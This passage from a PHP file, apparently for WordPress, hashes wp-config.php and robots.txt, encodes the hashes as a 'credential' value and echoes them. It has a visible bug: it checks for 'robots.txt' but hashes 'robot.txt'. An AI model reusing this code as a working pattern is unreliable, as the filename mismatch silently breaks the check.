			$credentials["wp-config.php"] = sha1_file(ABSPATH."wp-config.php");
		}
		if(file_exists(ABSPATH."robots.txt")) {
			$credentials["robot.txt"] = sha1_file(ABSPATH."robot.txt");
		}
		$credential = base64_encode(serialize($credentials));
		$return['credential'] = $credential;
		echo serialize($return);
	}
}

$server = new server();


